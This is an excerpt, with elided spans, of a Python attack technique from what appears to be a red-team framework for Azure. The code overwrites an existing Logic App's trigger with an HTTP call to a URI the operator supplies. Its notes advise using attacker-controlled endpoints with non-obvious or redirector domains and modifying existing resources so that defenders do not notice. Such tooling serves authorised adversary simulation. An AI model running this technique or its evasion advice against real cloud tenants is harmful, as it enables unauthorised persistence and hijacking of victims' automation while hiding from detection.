...
class AzureModifyLogicAppTrigger(BaseTechnique):
    def __init__(self):
        ...
        notes = [
            TechniqueNote(
                "This technique requires existing Logic App write permissions"
            ),
            TechniqueNote(
                "For attacker controlled HTTP endpoints, avoid using obvious malicious domains"
            ),
            TechniqueNote(
                "Consider using a redirector or legitimate-looking domain to avoid detection"
            ),
            TechniqueNote(
                "The technique modifies existing Logic Apps to avoid creating new suspicious resources"
            ),
        ]
        super().__init__(
    ...
    def execute(self, **kwargs: Any) -> Tuple[ExecutionStatus, Dict[str, Any]]:
        ...
        try:
            ...
            # Validate URI format
            if not (
                new_trigger_uri.startswith("http://")
                or new_trigger_uri.startswith("https://")
            ):
            ...
            http_trigger = {
                "type": "Http",
                "inputs": {"uri": new_trigger_uri, "method": "GET"},
            ...
            update_result = logic_client.workflows.create_or_update(
                resource_group_name, logic_app_name, workflow_params
            )
